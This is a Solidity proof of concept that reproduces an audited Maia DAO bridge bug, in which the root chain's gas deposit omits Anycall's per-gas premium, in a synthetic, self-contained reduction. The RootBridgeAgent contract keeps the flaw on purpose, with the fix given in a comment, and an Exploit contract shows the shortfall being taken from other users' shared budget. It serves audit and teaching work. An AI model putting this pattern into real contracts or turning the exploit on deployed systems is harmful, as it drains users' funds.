// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Maia DAO — User may underpay for the remote call ExecutionGas on the
    root chain (Code4rena 2023-05, [H-14], #26048)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.

    Root cause: RootBridgeAgent._payExecutionGas computes
        minExecCost = gasprice * gasUsedEstimate
    and replenishes only that into Anycall's executionBudget. AnycallV7
    chargeFeeOnDestChain bills
        totalCost = gasUsed * (gasprice + premium)
    so the budget is short by gasUsed * premium. That gap is taken from the
    shared execution budget (other users' gas deposits).
//////////////////////////////////////////////////////////////////////////*/

/// @dev Reduced AnycallV7Config fee accounting.
contract AnycallV7Config {
    uint256 public premium; // extra wei per gas on top of gasprice
    mapping(address => uint256) public executionBudget;
    uint256 public accruedFees;

    constructor(uint256 _premium) {
        premium = _premium;
    }

    function depositBudget(address app, uint256 amount) external payable {
        require(msg.value == amount, "value");
        executionBudget[app] += amount;
    }

    /// @dev Charge with explicit gasprice (browser VM often has tx.gasprice == 0).
    function chargeWithExplicit(address _from, uint256 gasUsed, uint256 gasPrice) public {
        uint256 totalCost = gasUsed * (gasPrice + premium);
        uint256 budget = executionBudget[_from];
        require(budget >= totalCost, "no enough budget");
        executionBudget[_from] = budget - totalCost;
        accruedFees += totalCost;
    }
}

/// @notice Reduced RootBridgeAgent — underpays minExecCost (missing premium).
///         Uses an explicit gasprice so the PoC is deterministic offline and in-browser.
contract RootBridgeAgent {
    AnycallV7Config public immutable anycallConfig;
    uint256 public immutable gasPrice; // synthetic stand-in for tx.gasprice
    uint256 public constant MIN_EXECUTION_OVERHEAD = 50_000;

    uint256 public lastMinExecCost;
    uint256 public lastDeposited;

    constructor(AnycallV7Config _cfg, uint256 _gasPrice) {
        anycallConfig = _cfg;
        gasPrice = _gasPrice;
    }

    /// @dev VERBATIM bug shape: minExecCost ignores premium.
    function _payExecutionGas(uint256 _initialGas) internal {
        uint256 gasUsedEstimate = MIN_EXECUTION_OVERHEAD + _initialGas;
        uint256 minExecCost = gasPrice * gasUsedEstimate; // @> VULN: missing + premium (Anycall charges gasprice+premium)
        // FIX: uint256 minExecCost = (gasPrice + anycallConfig.premium()) * gasUsedEstimate;

        lastMinExecCost = minExecCost;
        lastDeposited = minExecCost;
        // _replenishGas deposits minExecCost into executionBudget
        anycallConfig.depositBudget{value: minExecCost}(address(this), minExecCost);
    }

    function remoteEntry(uint256 _initialGas) external payable {
        _payExecutionGas(_initialGas);
    }

    receive() external payable {}
}

/// @notice Other users pre-fund 1 ETH of shared execution budget. User/agent
///         underpays one remote call (no premium). Anycall charges with premium;
///         the premium gap is stolen from the shared budget.
///         run() is payable — fund via attackValueWei / forge deal.
contract Exploit {
    uint256 public constant PREMIUM = 10 gwei;
    uint256 public constant GAS_PRICE = 1 gwei;
    uint256 public constant MIN_OVERHEAD = 50_000;
    uint256 public constant INITIAL_GAS = 100_000;
    uint256 public constant GAS_USED = 150_000; // MIN_OVERHEAD + INITIAL_GAS

    AnycallV7Config public config;
    RootBridgeAgent public agent;

    uint256 public sharedBudgetStart;
    uint256 public sharedBudgetEnd;
    uint256 public depositedByAgent;
    uint256 public chargedByAnycall;
    uint256 public stolenFromShared;

    constructor() {
        config = new AnycallV7Config(PREMIUM); // CREATE 1
        agent = new RootBridgeAgent(config, GAS_PRICE); // CREATE 2 — vulnerable
    }

    function run() external payable {
        require(msg.value >= 1 ether + GAS_PRICE * (MIN_OVERHEAD + INITIAL_GAS), "need eth seed+underpay");

        // Other users pre-funded the agent's Anycall execution budget with 1 ETH
        config.depositBudget{value: 1 ether}(address(agent), 1 ether);
        sharedBudgetStart = config.executionBudget(address(agent));
        require(sharedBudgetStart == 1 ether, "shared budget seeded");

        // Fund agent with enough for minExecCost (no premium)
        uint256 minExecCost = GAS_PRICE * (MIN_OVERHEAD + INITIAL_GAS);
        (bool sent,) = address(agent).call{value: minExecCost}("");
        require(sent, "fund agent");

        // Agent underpays into budget
        agent.remoteEntry(INITIAL_GAS);
        depositedByAgent = agent.lastDeposited();

        // Anycall charges with premium after execution
        uint256 costWithPremium = GAS_USED * (GAS_PRICE + PREMIUM);
        config.chargeWithExplicit(address(agent), GAS_USED, GAS_PRICE);

        sharedBudgetEnd = config.executionBudget(address(agent));
        chargedByAnycall = costWithPremium;
        stolenFromShared = chargedByAnycall - depositedByAgent;

        // HARM: premium gap taken from other users' shared execution budget
        require(depositedByAgent == minExecCost, "deposited underpay amount");
        require(chargedByAnycall > depositedByAgent, "charge exceeds deposit");
        require(stolenFromShared == GAS_USED * PREMIUM, "premium gap stolen from shared budget");
        require(sharedBudgetEnd == sharedBudgetStart + depositedByAgent - chargedByAnycall, "budget math");
        require(sharedBudgetEnd < sharedBudgetStart, "shared budget drained");
    }

    receive() external payable {}
}
